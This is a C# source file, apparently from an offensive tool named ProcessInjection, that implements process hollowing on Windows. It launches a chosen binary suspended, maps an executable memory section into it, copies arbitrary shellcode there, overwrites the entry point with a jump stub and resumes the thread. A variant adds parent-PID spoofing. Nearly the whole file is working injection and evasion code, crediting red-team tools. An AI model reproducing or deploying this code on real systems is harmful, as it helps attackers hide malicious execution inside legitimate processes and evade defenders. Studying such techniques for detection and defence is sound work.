using System;
using System.Collections.Generic;
using static ProcessInjection.Native.Win32API;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Constants;
using static ProcessInjection.Utils.Utils;
using System.Runtime.InteropServices;
using ProcessInjection.Native;

namespace ProcessInjection.PInvoke
{
    public class ProcessHollowing
    {
        /*
           Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
           https://github.com/ambray/ProcessHollowing
           https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
           https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
           */

        #region Process Hollowing
        public IntPtr section_ ;
        public IntPtr localmap_ ;
        public IntPtr remotemap_ ;
        public IntPtr localsize_ ;
        public IntPtr remotesize_ ;
        public IntPtr pModBase_ ;
        public IntPtr pEntry_;
        public uint rvaEntryOffset_;
        public uint size_;
        public byte[] inner_;
        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const ulong PatchSize = 0x10;
        public const int AttributeSize = 24;

        #endregion Process Hollowing


        public ProcessHollowing()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }



        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }


        public static PROCESS_INFORMATION StartProcess(string binaryPath)
        {
            uint flags = CreateSuspended;

            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);

            PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");

            return procInfo;
        }

        /*
        https://github.com/peperunas/injectopi/tree/master/CreateSection
        Attemp to create executatble section
        */
        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
            PrintInfo($"[!] Executable section created.");
            return nt_success(status);
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public void SetLocalSection(uint size)
        {

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            PrintInfo($"[!] Map view section to the current process: {vals}.");
            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            PrintInfo($"[!] Copying Shellcode into section: {lsize}. ");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
            PrintInfo($"[!] Preparing shellcode patch for the new process entry point: {ptr}. ");

            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            PrintInfo($"[!] Locating the entry point for the main module in remote process.");
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            PrintInfo($"[!] Locating the module base address in the remote process.");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebBaseAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebBaseAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;

            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
            PrintInfo($"[!] Read the first page and locate the entry point: {readLoc}.");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            PrintInfo($"[!] Locate shellcode into the suspended remote porcess: {tmp}.");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);

            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);

            uint res = ResumeThread(pInfo.hThread);
            PrintSuccess($"[+] Process has been resumed.");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }

        ~ProcessHollowing()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);
        }


        public void ProcHollow(string binary, byte[] shellcode)
        {
            PROCESS_INFORMATION pinf = StartProcess(binary);
            CreateSection((uint)shellcode.Length);
            FindEntry(pinf.hProcess);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        

        public void PPIDProcHollow(string binary, byte[] shellcode, int parentpid)
        {
            PPIDSpoofing Parent = new PPIDSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            ProcessHollowing hollow = new ProcessHollowing();
            hollow.CreateSection((uint)shellcode.Length);
            hollow.FindEntry(pinf.hProcess);
            hollow.SetLocalSection((uint)shellcode.Length);
            hollow.CopyShellcode(shellcode);
            hollow.MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }
    }
}
